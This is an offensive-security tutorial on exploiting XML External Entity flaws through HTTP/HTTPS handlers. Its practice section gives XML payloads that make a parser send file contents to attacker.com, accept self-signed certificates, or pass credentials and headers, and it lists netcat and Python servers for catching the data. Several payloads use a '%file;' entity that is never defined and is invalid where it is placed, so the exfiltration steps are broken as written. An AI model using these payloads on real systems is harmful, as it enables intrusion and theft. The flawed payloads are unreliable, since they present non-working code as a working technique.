---
title: Exploiting HTTP/HTTPS Protocol XXE Vulnerabilities
description: Learn how to exploit XML External Entity vulnerabilities via HTTP/HTTPS
  protocol handlers, bypassing SSL and leveraging authentication.
keywords:
- XXE vulnerabilities
- HTTP protocol
- HTTPS protocol
- SSL bypass
- certificate validation
- data exfiltration
- HTTP authentication
---

# HTTP/HTTPS Protocol XXE

## Context

The purpose of this article is to demonstrate how XML External Entity (XXE) vulnerabilities can be exploited via HTTP/HTTPS protocol handlers. The technique includes bypassing SSL validation, leveraging HTTP authentication, and exfiltrating data over HTTP(S). Readers should already be familiar with XML parsing and entity resolution, the basics of HTTP and HTTPS protocols, SSL/TLS fundamentals, certificate validation mechanisms, and general XXE exploitation concepts.

## Theory

### HTTP/HTTPS Protocol Handlers in XML Parsers

Protocol handlers allow XML parsers to fetch external entities using HTTP or HTTPS URLs. When enabled, these handlers enable XXE payloads to trigger outbound web requests. Vulnerable XML parsers that are improperly configured might allow arbitrary HTTP(S) requests, leading to data exfiltration or server-side request forgery (SSRF).

### SSL/TLS and Certificate Validation Bypass in XXE

Some XML parsers do not validate SSL certificates properly. This flaw allows attackers to use self-signed or otherwise invalid certificates. If SSL validation is lax, attackers can control HTTPS endpoints for exfiltrating data through XXE payloads.

### HTTP Authentication and Custom Headers in XXE

XXE payloads that use HTTP(S) can include credentials or custom headers to access protected resources. Attackers can craft payloads that reference resources requiring authentication, supplying credentials in the URL or headers.

### Data Exfiltration via HTTP(S) in XXE

Attackers can employ XXE to read sensitive files or data. Such data is then sent to attacker-controlled HTTP(S) endpoints. Here is a simplified sequence:

```mermaid
flowchart TD
    A[Victim XML Parser] -->|Parses XXE| B[External Entity: http(s)://attacker]
    B -->|HTTP(S) Request| C[Attacker Server]
    C -->|Receives Data| D[Attacker]
```

## Practice

### Exfiltrate Sensitive Data via HTTP XXE

- **Payload:**
  ```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com:8080/?data=%file;">]>
  <root>&xxe;</root>
  ```
  This XML document defines an external entity that references an HTTP endpoint controlled by the attacker.

- Set up a web server to capture incoming requests containing exfiltrated data. This involves hosting a simple HTTP server that logs all incoming GET requests, which can be simply done with tools like netcat (`nc`), Python's HTTP server module, or tools like Burp Suite.

**Outcome:** Sensitive file contents are sent to the attacker's HTTP server.

### Bypass SSL Validation with HTTPS XXE

- **Payload:**
  ```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://attacker.com:8443/?data=%file;">]>
  <root>&xxe;</root>
  ```

- Host an HTTPS server with a self-signed certificate to capture exfiltrated data. Use tools like `OpenSSL` to create a self-signed certificate and serve your site using it, verifying whether the vulnerable parser accepts invalid SSL certificates.

**Outcome:** Sensitive data is exfiltrated over HTTPS, potentially bypassing SSL validation.

### HTTP Basic Authentication in XXE Payloads

- **Payload:**
  ```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://user:pass@attacker.com:8080/">]>
  <root>&xxe;</root>
  ```

- Monitor the attacker's server for authenticated requests, checking if the XML parser properly sends credentials included in the XXE payload.

**Outcome:** Data is sent to an attacker's endpoint using supplied HTTP authentication.

### Custom HTTP Headers in XXE Exploitation

- **Payload:**
  ```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com:8080/">]>
  <root>&xxe;</root>
  ```

- Configure the attacker's server to log all incoming headers. Monitor these logs to detect any custom or sensitive headers added by the parser, demonstrating how private data or authentication might be leaked.

**Outcome:** The attacker receives HTTP requests with potential custom or sensitive headers.

## Tools

- **Burp Suite**
- **nc** (netcat)
- **Python HTTP server (http.server)**
- **OpenSSL** 